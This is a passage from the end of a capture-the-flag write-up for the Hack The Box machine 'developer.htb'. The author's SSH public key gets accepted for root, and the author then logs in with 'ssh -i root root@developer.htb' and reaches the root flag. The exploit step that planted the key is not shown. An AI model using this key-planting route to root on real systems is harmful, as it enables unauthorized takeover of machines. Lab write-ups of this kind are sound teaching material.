ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBVAyTfSW+5B/A8CKn+kLk2foFEJQF3kMoateAAnUQvKkeKVAfzua35kBdvXGPZg9wOoIw1CAUt6m+VV6CG9eBeiXj+I8xlXDj5LkihywJcFgGtN1Ye9RK0ESir07icwpDhi6vkjomml2CeM2ZJxZQvBEBOeJeD/Cz9KPbWcIls4qJuBqlsch/FmaQwpAG5HH4HGA3d8F6UnDt+Y00UP3WRIQsT5MFtknjucebLFaHoDzL6v+pZcVO83IaDn+NxPI1UKx+lq7giHNqnxpxWLasbJdIYOwKBRpOn3ecUmUsu/R7wnIqP1XCl0y+pr88PlDf5McdcXIfZsaAl4HJkgIrY20UtD5ZIGuZO5qmUMzUjyGReFxtueAniiYcjq16W9hy/JIofXgOi8sTjy6iXV1goHoS6zKthv4xkU9/ASDWaL918qlrELvQ0Ki65H3ymlIlG7+XLwoLRYNxBswlECMDTkQfRJXPaCP1XubDOXxTFXwJrsTD75w9qGhUuEziZ1s= jack@parrot
You may now authenticate as root!
```

Using the generate private key we are now indeed able to log in as the root user and grab the flag.

```
$ ssh -i root root@developer.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 23 Aug 17:38:29 UTC 2021

  System load:           0.0
  Usage of /:            77.7% of 5.84GB
  Memory usage:          51%
  Swap usage:            11%
  Processes:             268
  Users logged in:       2
  IPv4 address for eth0: 10.129.190.110
  IPv6 address for eth0: dead:beef::250:56ff:feb9:a856


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Aug 23 08:18:28 2021 from 10.10.14.73
root@developer:~# wc -c root.txt
33 root.txt
```